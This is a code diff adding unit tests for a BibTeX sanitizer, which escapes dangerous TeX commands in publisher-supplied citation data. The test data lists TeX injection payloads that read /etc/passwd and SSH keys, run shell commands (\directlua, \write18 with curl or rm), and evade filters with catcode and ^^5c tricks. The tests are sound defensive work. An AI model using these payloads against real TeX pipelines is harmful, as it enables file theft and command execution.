@@ -79,3 +79,112 @@ describe('A2: cite writes clean, escaped values (recorded doi.org responses)', (
     );
   });
 });
+
+describe('P0-7: publisher BibTeX keeps only an allowlist of TeX commands', () => {
+  /** Control words left in `s`, other than the ones the sanitizer itself writes. */
+  const keptWords = (s: string) =>
+    [...s.matchAll(/\\([A-Za-z]+)/g)]
+      .map((m) => m[1])
+      .filter((w) => w !== 'textbackslash' && w !== 'textasciicircum');
+
+  const payloads = [
+    '\\pdfextension obj file{/etc/passwd}',
+    '\\pdfextension annot{/Subtype/FileAttachment}',
+    '\\pdffeedback{lastobj}',
+    '\\pdfobj file{/home/user/.ssh/id_rsa}',
+    '\\immediate\\pdfobj stream file {secret.txt}',
+    '\\filedump{offset=0}{secret}',
+    '\\luaescapestring{x}',
+    '\\input{/etc/passwd}',
+    '\\directlua{os.execute("id")}',
+    '\\catcode`\\@=0 @input x',
+    '\\csname input\\endcsname{x}',
+    '\\write18{curl evil}',
+    '\\immediate\\write18{rm}',
+    '\\openin1=secret \\read1 to\\x',
+    '\\read16 to \\x',
+    '\\pdffiledump{/etc/passwd}',
+    '\\pdfmdfivesum file{x}',
+    '\\XeTeXpdffile "x.pdf"',
+    '\\special{pdf: embed}',
+    '\\@input{x}',
+    '\\IfFileExists{x}{}{}',
+    '\\ExplSyntaxOn \\file_input:n {x}',
+    '$\\input{x}$',
+    '$\\directlua{os.exit()}$',
+    '^^5cinput{x}',
+    '\\^^5cinput{x}',
+    'trailing \\',
+  ];
+
+  it.each(payloads)('neutralizes %s', (payload) => {
+    const out = sanitizeTexValue(payload);
+    expect(keptWords(out)).toEqual([]);
+    expect(out).not.toContain('^^');
+    // Every backslash left is either our \textbackslash or a control symbol that prints.
+    for (const m of out.matchAll(/\\(.)/g))
+      expect(m[1], out).toMatch(/[A-Za-z"'`^~=.&%#_${},;:!\-/ |\\\n\t]/);
+  });
+
+  it('neutralizes the payloads in every field of a fetched entry', async () => {
+    const bib = `@misc{x, title = {Data \\pdfextension obj file{/etc/passwd}}, author = {Doe, J. \\pdffeedback x},
+  note = {\\filedump{secret}}, howpublished = {\\input{x}}, publisher = {Zenodo \\luaescapestring{x}},
+  year = {2024}, version = {\\pdfobj file{x} \\directlua{x} \\csname x\\endcsname}}`;
+    const f = handlerFetch((u, accept) => {
+      if (u.host !== 'doi.org') return new Response('', { status: 404 });
+      return accept.includes('bibtex')
+        ? new Response(bib, { headers: { 'content-type': 'application/x-bibtex' } })
+        : new Response(
+            JSON.stringify({ type: 'dataset', title: 'Data', author: [{ family: 'Doe' }] }),
+            { headers: { 'content-type': 'application/vnd.citationstyles.csl+json' } },
+          );
+    });
+    const r = await lookup('10.5281/zenodo.99', { fetch: f.fetch, ...fast });
+    const text = formatBibEntry(r?.entry as NonNullable<typeof r>['entry']);
+    for (const name of [
+      'pdfextension',
+      'pdffeedback',
+      'filedump',
+      'input',
+      'luaescapestring',
+      'pdfobj',
+      'directlua',
+      'csname',
+    ])
+      expect(text).not.toMatch(new RegExp(`(?<!textbackslash\\{\\})\\\\${name}`));
+    expect(text).toContain('\\textbackslash{}pdfextension obj file{/etc/passwd}');
+  });
+
+  it('keeps accents, special letters, formatting and escaped specials', () => {
+    const kept = [
+      'G\\"odel',
+      "Erd\\H{o}s and Caf\\'e",
+      '\\c{C}a\\u{g}lar \\v{S}koda \\k{a} \\r{A}ngstr\\"om',
+      "{\\ss} {\\o} {\\AE} {\\L}\\'od\\'z {\\i}",
+      '\\textit{et al.} \\textbf{bold} \\emph{e} \\textsc{Sc}',
+      '{\\it old} {\\bf style}',
+      'H\\textsubscript{2}O and x\\textsuperscript{2}',
+      'R\\&D 50\\% \\#1 a\\_b \\$5 \\{x\\}',
+      'A{\\textendash}B {\\textemdash} {\\textquoteright}',
+      '{\\LaTeX} and {\\TeX}',
+      'line\\\\break and a\\-hyphen',
+    ];
+    for (const v of kept) expect(sanitizeTexValue(v)).toBe(v);
+  });
+
+  it('keeps math made of allowed commands and escapes the rest', () => {
+    expect(sanitizeTexValue('$x^2$ and $\\alpha \\leq \\mathcal{O}(n \\log n)$')).toBe(
+      '$x^2$ and $\\alpha \\leq \\mathcal{O}(n \\log n)$',
+    );
+    expect(sanitizeTexValue('$\\mathsemicolon$ $\\less$ $\\frac{1}{2}$')).toBe(
+      '$\\mathsemicolon$ $\\less$ $\\frac{1}{2}$',
+    );
+    // A math-only command outside math is printed, not run.
+    expect(sanitizeTexValue('\\alpha')).toBe('\\textbackslash{}alpha');
+  });
+
+  it('a kept command at the end cannot merge with the text that follows', () => {
+    expect(sanitizeTexValue('Stra\\ss')).toBe('Stra\\ss{}');
+    expect(sanitizeTexValue('x \\i')).toBe('x \\i{}');
+  });
+});
